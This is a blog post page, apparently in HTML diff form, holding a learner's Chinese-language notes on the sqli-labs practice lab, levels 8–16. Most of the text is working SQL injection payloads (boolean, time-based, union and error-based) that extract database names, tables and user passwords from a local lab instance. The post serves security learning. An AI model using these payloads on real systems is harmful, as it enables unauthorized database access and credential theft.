@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Less-8 基于布尔盲注游戏进行到这里，按照正常的剧情难度应该增加，这里有必要学习一下SQL盲注。SQL盲注何为盲注？在我们执行sql语句后，选择的数据不能回显到前端页面。这时候我们需要利用一些方法进行判断或尝试，这个过程称为盲注。盲注分为三类：  基于布尔盲注，布尔也就是true和false，他只会根据你的注入信息返回true或false，也就是说我们得不到报错信息 基于时间盲注，页面返回值只">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli labs8-16学习笔记">
+<meta property="og:url" content="https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Intro&#39; Blog">
+<meta property="og:description" content="Less-8 基于布尔盲注游戏进行到这里，按照正常的剧情难度应该增加，这里有必要学习一下SQL盲注。SQL盲注何为盲注？在我们执行sql语句后，选择的数据不能回显到前端页面。这时候我们需要利用一些方法进行判断或尝试，这个过程称为盲注。盲注分为三类：  基于布尔盲注，布尔也就是true和false，他只会根据你的注入信息返回true或false，也就是说我们得不到报错信息 基于时间盲注，页面返回值只">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less14.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less17.png">
+<meta property="article:published_time" content="2018-09-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-29T10:13:58.242Z">
+<meta property="article:author" content="Intro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less13.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>sqli labs8-16学习笔记</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/10/11/sqli%20labs17-22%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=sqli labs8-16学习笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs8-16学习笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=sqli labs8-16学习笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqli labs8-16学习笔记&body=Check out this article: https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs8-16学习笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs8-16学习笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs8-16学习笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs8-16学习笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=sqli labs8-16学习笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=sqli labs8-16学习笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        sqli labs8-16学习笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Intro</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-09-28T16:00:00.000Z" class="dt-published" itemprop="datePublished">2018-09-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Less-8 基于布尔盲注游戏进行到这里，按照正常的剧情难度应该增加，这里有必要学习一下SQL盲注。SQL盲注何为盲注？在我们执行sql语句后，选择的数据不能回显到前端页面。这时候我们需要利用一些方法进行判断或尝试，这个过程称为盲注。<br><strong>盲注分为三类：</strong></p>
+<ol>
+<li>基于布尔盲注，布尔也就是true和false，他只会根据你的注入信息返回true或false，也就是说我们得不到报错信息</li>
+<li>基于时间盲注，页面返回值只有一种，无论输入什么值都会按正常处理。加入特定的时间函数，通过web页面返回的时间差来判断注入语句是否正确</li>
+<li>基于报错盲注，构造payload让信息通过错误提示回显出来</li>
+</ol>
+<p>基于布尔盲注这里用到几个函数：<br><strong>Left()</strong><br><code>left(database(),1)&gt;&#39;s&#39;</code> &#x2F;&#x2F;database()显示数据库名称，left(a,b)从左边截取a的前b位进行测试<br><strong>Substr()</strong><br><code>substr(database(),1,1)&gt;&#39;a&#39;</code> &#x2F;&#x2F;查看database()第一位的第一个字符<br><code>substr(database(),2,1)&gt;&#39;a&#39;</code> &#x2F;&#x2F;同理，查看第二位的第一个字符<br><strong>Ascii()</strong><br>将某个字符转换成它的ASCII码<br><strong>ord()</strong><br><code>ord(mid(database(),1,1))&gt;114</code> &#x2F;&#x2F;ord()函数返回第一个字符的ASCII码，mid()函数和substr()类似<br><strong>regexp正则注入</strong><br>因为在MYSQL 5+中information_schema库中存储了所有的库名，表名以及字段名信息，所以：</p>
+<ol>
+<li>判断第一个表名的第一个字符是否为<code>a-z</code>中的字符，假设<code>security</code>是已知库名<br><code>?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#39;^[a-z]&#39; LIMIT 0,1) --+</code></li>
+<li>判断第一个表名的第一个字符是否为<code>a-n</code>中的字符<br><code>?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#39;^[a-n]&#39; LIMIT 0,1)--+</code></li>
+<li>判断该字符为n<br><code>?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#39;^n&#39; LIMIT 0,1) --+</code></li>
+<li>表达式更换<br><code>&#39;^n[a-z]&#39; -&gt; &#39;^ne[a-z]&#39; -&gt; &#39;^new[a-z]&#39; -&gt; &#39;^news[a-z]&#39; -&gt; FALSE</code><br>这里简单介绍下，欲知详情<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5717442.html">点击这里</a></li>
+</ol>
+<p>基于时间盲注<strong>sleep()函数</strong><br><code>sleep(seconds)</code>表示函数代码执行延迟若干秒<br><strong>BENCHEMARK()函数</strong><br><code>BENCHEMARK(count,expr)</code>表示重复执行expr若干次<br><strong>if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))%23</strong> &#x2F;&#x2F;if判断语句，条件为假执行sleep基于报错盲注感觉这个有点类似前面的<a target="_blank" rel="noopener" href="http://lntro.xyz/2018/09/26/sqli-labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more">双查询注入</a>回到题目开始用<code>?id=1&#39;</code>没有回显，<code>?id=1&#39;--+</code>得到回显，然后通过上面的函数构造一个函数猜测数据库名长度<code>(length(database()))&gt;10</code>，最后得到长度为8<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less13.png" alt="1539010328564"><br>接下来利用substr函数和ascii函数构造猜测数据库名的ascii码值，语句如下：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3 4</code></td>
+<td><code>?id=1&#39; and (ascii(substr(database(),1,1)))&gt;100--+ //返回正确说明第一个字母的ascii码大于100 ?id=1&#39; and (ascii(substr(database(),1,1)))&gt;120--+ //返回错误 ?id=1&#39; and (ascii(substr(database(),1,1)))=115--+ //返回正确，说明第一个字母的ascii码为115，即为s http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and (ascii(substr(database(),2,1)))=101--+ //同理猜出第二个字母为e</code></td>
+</tr>
+</tbody></table>
+<p>经过测试得到数据库名为**‘security’**，接下来猜测表名</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1</code></td>
+<td><code>?id=1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100--+  //类似的稍微修改一下</code></td>
+</tr>
+</tbody></table>
+<p>得知第一个表名为**‘email’**，结果正确，接着我们猜测user表的内容</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1</code></td>
+<td><code>?id=1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)))=117--+ //由于机器上装了DVWA所以这里users表有两个结果可能有些出入</code></td>
+</tr>
+</tbody></table>
+<p>通过修改limit 0,1来得到第二个列名，修改后面的1，1得到当前列的其他字段。<br>接着获取username和password里面的内容</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1</code></td>
+<td><code>?id=1&#39; and (ascii(substr((select password from users limit 0,1),1,1)))=68--+ //ascii(68)=D 正确</code></td>
+</tr>
+</tbody></table>
+<p>Less-9 基于时间盲注无论我们输入的语句是否正确，都只返回<strong>You are in……</strong>，所以这里用到时间盲注（根据返回结果的时间长短判断注入语句是否执行）<br><strong>猜解数据库：</strong><br><code>id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code><br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less14.png" alt="1539075273358">可以看到时间只有1s，所以猜解正确，数据库的第一位是ascii(115)也就是’s’，修改payload<code>id=1&#39; and if(ascii(substr(database(),2,1))=101,1,sleep(5))--+</code>继续猜解第二位第三位…<br>最后可以猜解到数据库的名称为”security”<br><strong>猜解security库的表名：</strong><br><code>?id=1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,1,sleep(5))--+</code><br>猜解出第一个表的第一位是e，也就是第一个表”email”，修改<code>limit 1,1</code>继续猜解后面的表，得到我们需要的<code>user</code>表<br>不得不说手工盲注挺繁琐的，这里因为括号太多导致payload一直出错，但是掌握手工盲注的原理对以后使用工具有很大帮助<br><strong>猜解user表的列名：</strong><br><code>?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;user&#39; limit 0,1),1,1))=105,1,sleep(5))--+</code>或者<code>?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() limit 0,1),1,1))=105,1,sleep(5))--+</code>由于本机上存在多个users表，所以我用的第二种，原理是一样的，只是这里限定条件不同，因为这里security库只有一个：<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less15.png" alt="1539077562078"><br><strong>猜解字段值：</strong><br>最后就是获取username和password的值啦，比较简单直接给payload</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2</code></td>
+<td><code>?id=1&#39; and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+ //username第一位 ?id=1&#39; and if(ascii(substr((select password from users limit 0,1),1,1))=68,1,sleep(5))--+ //password第一位</code></td>
+</tr>
+</tbody></table>
+<p>这道题还可以用benchmark()函数<br><code>?id=1&#39; union select if(ascii(substring(database(),1,1)) = 115, benchmark(100000000,encode(&#39;hello&#39;,&#39;hi&#39;)), null),1,1 --+</code>如果正确会等待很长一段时间，根据自己构造的payload可以灵活使用Less-10 基于时间盲注本题从题目就可以知道是基于双引号，参考Less-9只需要将单引号改为双引号就OK了！Less-11 基于错误盲注到了这一关就和前面不太一样了，发现前面都是基于<code>GET</code>的注入点，这里在URL中找不到id等字段，说明应该是POST注入。<br>首先输入<code>uname=1&#39;&amp;passwd=aaa</code>从报错信息可以知道SQL语句为：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3</code></td>
+<td><code>$uname=$_POST[&#39;uname&#39;]; $passwd=$_POST[&#39;passwd&#39;]; SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1</code></td>
+</tr>
+</tbody></table>
+<p>于是构造<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less16.png" alt="1539082958795"><br><code>SELECT username, password FROM users WHERE username=&#39;admin&#39;#&#39;&#39; and password=&#39;123&#39; LIMIT 0,1</code>&#x3D;&gt;<code>SELECT username, password FROM users WHERE username=&#39;admin&#39;</code><br>到这里能看得出来和Less-1差不多，那么就按照正常步骤来</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3 4 5 6 7 8 9</code></td>
+<td><code>构造payload对username注入，password为空 1&#39; order by 1#  //正常 1&#39; order by 2#  //正常 1&#39; order by 3#  //报错，说明只有两行 1&#39; union select 1,group_concat(schema_name) from information_schema.schemata#  //爆库 1&#39; union select 1,database()  //得到当前数据库为security 1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#  //爆表 1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;#  //爆列名 1&#39; union select username,password from users where id=2#  //爆数据</code></td>
+</tr>
+</tbody></table>
+<p>Less-12 基于错误盲注username输入<code>admin&#39;</code>没有回显，<code>admin&quot;</code>返回报错，由报错信息知对数据进行了**(“$usrname”)<strong>，于是构造<code>admin&quot;)#</code>即可，在Less-11的基础上稍加修改就OKLess-13 双注入查询经过测试，发现对数据进行</strong>(‘$usrname’)**处理，而且没有回显的数据，只能看到报错的回显，于是这里想到前面的双注入查询也就是盲注</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3</code></td>
+<td><code>1&#39;) union select count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a#  //基于报错的盲注 admin&#39;) and left(database(),1)=&#39;s&#39;# //基于布尔的盲注</code></td>
+</tr>
+</tbody></table>
+<p>Less-14 双注入查询直接测试username：admin” &amp; password：空<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less17.png" alt="1539089068302"><br>可知过滤为**“usrname”**，然后开始盲注和上一题类似不做累赘。<br>学点新姿势：基于extractvalue()和updatexml()的报错注入,给个<a target="_blank" rel="noopener" href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">地址</a></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2</code></td>
+<td><code>admin&quot; and extractvalue(1,concat(0x7e,(select @@version),0x7e))# admin&quot; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</code></td>
+</tr>
+</tbody></table>
+<p>Less-15 基于布尔&#x2F;时间盲注此题貌似没有回显，应该是要基于时间的盲注，经过测试发现进行了**‘username’<strong>处理，直接给payload：<br><code>admin&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))#</code>步骤类似Less-9，这里不测试了Less-16 基于布尔&#x2F;时间盲注经过测试，数据处理格式为</strong>(“username”)<strong>，和Less-15一样，将</strong>‘<strong>改为</strong>“)**就OK小结做到这里感觉最基础的SQL注入知识就差不多掌握了，感觉系统的学习是对提升最有帮助的，路还很长要加油鸭！</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=sqli labs8-16学习笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs8-16学习笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=sqli labs8-16学习笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqli labs8-16学习笔记&body=Check out this article: https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs8-16学习笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs8-16学习笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs8-16学习笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs8-16学习笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=sqli labs8-16学习笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://1ntro.github.io/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=sqli labs8-16学习笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Intro
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
